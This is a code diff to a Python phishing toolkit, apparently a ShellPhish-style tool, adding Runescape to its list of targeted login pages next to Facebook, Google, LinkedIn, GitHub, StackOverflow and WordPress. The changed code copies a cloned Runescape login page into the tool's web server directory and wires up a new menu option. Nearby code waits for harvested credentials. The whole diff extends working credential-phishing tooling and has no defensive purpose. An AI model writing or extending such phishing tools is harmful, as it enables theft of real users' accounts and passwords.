@@ -91,6 +91,8 @@ def runPhishing(social, option2):
         system('cp WebPages/stackoverflow/*.* Server/www/')
     elif social == 'WordPress':
         system('cp WebPages/wordpress/*.* Server/www/')
+    elif social == 'Runescape':
+        system('cp WebPages/Runescape/*.* Server/www/')
 
 def waitCreds():
     print " {0}[{1}*{0}]{1} Waiting for credentials... \n".format(GREEN, END)
@@ -139,7 +141,7 @@ def runPEnv():
         system('clear')
         print '\n[ {0}YOU ARE NOT AUTHORIZED TO USE THIS TOOL{1} ]\n'.format(RED, END)
         exit(0)
-    option = raw_input("\nSelect an option:\n\n {0}[{1}1{0}]{1} Facebook\n\n {0}[{1}2{0}]{1} Google\n\n {0}[{1}3{0}]{1} LinkedIN\n\n {0}[{1}4{0}]{1} Github\n\n {0}[{1}5{0}]{1} StackOverflow\n\n {0}[{1}6{0}]{1} WordPress\n\n {0}SF >  {1}".format(CYAN, END))
+    option = raw_input("\nSelect an option:\n\n {0}[{1}1{0}]{1} Facebook\n\n {0}[{1}2{0}]{1} Google\n\n {0}[{1}3{0}]{1} LinkedIN\n\n {0}[{1}4{0}]{1} Github\n\n {0}[{1}5{0}]{1} StackOverflow\n\n {0}[{1}6{0}]{1} WordPress\n\n {0}[{1}7{0}]{1} Runescape\n\n{0}SF >  {1}".format(CYAN, END))
     if option == '1':
         loadModule('Facebook')
         option2 = raw_input("\nOperation mode:\n\n {0}[{1}1{0}]{1} Standard Page Phishing\n\n {0}[{1}2{0}]{1} Advanced Phishing(poll_mode/login_with)\n\n {0}SF > {1}".format(CYAN, END))
@@ -164,6 +166,10 @@ def runPEnv():
         loadModule('WordPress')
         option2 = ''
         runPhishing('WordPress', option2)
+    elif option == '7':
+        loadModule('Runescape')
+        option2 = ''
+        runPhishing('Runescape', option2)
     else:
         exit(0)
 
